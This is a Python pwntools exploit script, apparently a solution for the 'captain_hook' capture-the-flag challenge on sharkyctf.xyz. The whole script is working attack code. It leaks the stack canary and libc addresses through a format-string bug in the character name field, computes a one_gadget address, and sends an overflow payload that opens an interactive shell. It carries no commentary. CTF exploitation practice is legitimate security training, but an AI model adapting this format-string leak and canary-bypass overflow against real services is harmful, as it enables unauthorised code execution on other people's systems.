from pwn import * 

p = remote('sharkyctf.xyz', 20336)
#p= process('./captain_hook')


uu64    = lambda data               :u64(data.ljust(8, '\0'))


def make_new_chunk(r,index,age,date,name):
	r.sendlineafter("peterpan@pwnuser:~$ ","2")
	r.sendlineafter(" [ Character index ]: ",str(index))

	r.recvuntil("Name: ")
	r.sendline(str(name))

	r.recvuntil("Age: ")
	r.sendline(str(age))

	r.recvuntil("Date (mm/dd/yyyy): ")
	r.sendline(str(date))

def edit_a_chunk(r,index,age,date,name):
	r.sendlineafter("peterpan@pwnuser:~$ ","4")
	r.sendlineafter(" [ Character index ]: ",str(index))

	r.recvuntil("Name: ")
	r.sendline(str(name))

	r.recvuntil("Age: ")
	r.sendline(str(age))

	r.recvuntil("Date (mm/dd/yyyy): ")
	r.sendline(str(date))

def read_a_chunk(r,index):
	r.sendlineafter("peterpan@pwnuser:~$ ","3")
	r.sendlineafter(" [ Character index ]: ",str(index))

def cookie(r):


	date = "01/01/0100"
	name = "AAAAAAAAAA|%13$p"
	make_new_chunk(r,0,13,1414,"sandi")
	edit_a_chunk(r,0,3,date,name)
	read_a_chunk(r,0)


	r.recvline()
	r.recvline()


	addr1 = r.recvline().split("|")[1].replace(".","").strip()
	addr = int(addr1,16)
	log.info("cookie: "+hex(addr))
	
	return addr

def got(r):
	date = "01/01/1111"
	name = "AAAAAAAAAA|%7$p"


	edit_a_chunk(r,0,3,date,name)
	read_a_chunk(r,0)


	r.recvline()
	r.recvline()


	addr1 = r.recvline().split("|")[1].replace(".","").strip()
	addr = int(addr1,16)
	log.info("got_uselsss: "+hex(addr))
	return addr 


def leak_libc(r):

	date = "01/01/1111"
	got_addr= got(r)
	name = "AAAAAAAAAA|%19$p|AAAAAAA"+p64(got_addr)


	edit_a_chunk(r,0,3,date,name)
	read_a_chunk(r,0)

	r.recvline()
	r.recvline()


	addr1 = r.recvline().split("|")[1].replace(".","").strip()
	addr = int(addr1,16)


	printf_addr = addr + 275177
	libc_base = printf_addr - 0x64e80
	one_gadget = libc_base + 0x4f322
	log.info("one_gadget: "+hex(one_gadget))


	return one_gadget

#def edit_a_chunk(r,index,age,date,name):

def exploit(r):
	cookie_offset = "\x00"*40
	#cookie
	addr_offset = "\x00"*8
	#addr
	one_gadget_helper = "\x00" *60
	cookie_ = cookie(r)
	one_gadget = leak_libc(r)
	
	raw_input()

	payload = ''
	payload += cookie_offset
	payload += p64(cookie_)
	payload += addr_offset
	payload += p64(one_gadget)
	payload += one_gadget_helper

	edit_a_chunk(r,0,13,'00/00/0000',payload)

	r.interactive()


def get_leak(r):
	date = "01/01/0101"
	make_new_chunk(r,0,13,1414,"sandi")

	for num in range(1,30):
		if date == "01/01/0101":
			date = "01/01/0100"
		else:
			date = "01/01/0101"


		name = "AAAAAAAAAAAAAAAACCCCCCCCA|%{}$p".format(num)
		edit_a_chunk(r,0,num,date,name)
		read_a_chunk(r,0)


		r.recvline()
		r.recvline()

		addr1 =r.recvline().split("|")[1].replace(".","").strip()

		if "(nil)" in addr1:
			continue
		addr = int(addr1,16)

		print hex(addr)


exploit(p)

